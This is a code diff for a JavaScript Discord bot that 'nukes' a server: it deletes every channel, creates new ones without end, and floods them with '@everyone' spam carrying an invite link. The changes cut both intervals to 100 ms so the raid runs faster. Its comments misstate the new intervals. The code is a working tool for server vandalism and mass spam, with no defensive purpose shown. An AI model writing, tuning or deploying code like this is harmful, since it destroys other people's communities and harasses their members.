@@ -53,7 +53,7 @@ client.on('messageCreate', async (message) => {
         // Spam messages in the new channel
         setInterval(() => {
           channel.send('@everyone https://discord.gg/6Vtg4WpPHY');
-        }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
+        }, 100); // Faster interval for spam (500 ms = 0.5 second)
       };
 
       // Create the initial channel
@@ -62,7 +62,7 @@ client.on('messageCreate', async (message) => {
       // Infinite loop to continually create new channels and start spamming
       nukeInterval = setInterval(async () => {
         await createAndSpamChannel();
-      }, 10000); // Adjust the interval as needed (10000 ms = 10 seconds)
+      }, 100); // Faster interval for creating new channels (5000 ms = 5 seconds)
 
     } catch (error) {
       console.error('Error during nuke operation:', error);
@@ -82,6 +82,9 @@ client.on('messageCreate', async (message) => {
       for (const [id, channel] of allChannels) {
         await channel.delete();
       }
+
+      // Optionally, wait for a moment to ensure channels are deleted
+      await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 1 second
 
       // Create a "general" channel after all channels are deleted
       await message.guild.channels.create({
